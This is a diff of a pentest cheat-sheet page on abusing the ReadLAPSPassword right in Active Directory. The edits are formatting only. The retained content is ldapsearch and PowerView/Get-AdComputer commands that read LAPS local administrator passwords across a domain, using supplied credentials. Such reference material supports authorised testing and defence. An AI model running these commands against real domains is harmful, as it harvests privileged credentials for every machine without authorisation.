@@ -10,30 +10,20 @@ tags: ["ReadLAPSPassword", "active driectory", "ad", "Windows", "LAPS"]
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 ldapsearch -h <TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<TARGET> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 1. Import PowerView.ps1
-
-<div>
+#### 1. Import PowerView
 
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -47,18 +37,10 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
 #### 3. Read LAPS password
-
-<div>
 
 ```console
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
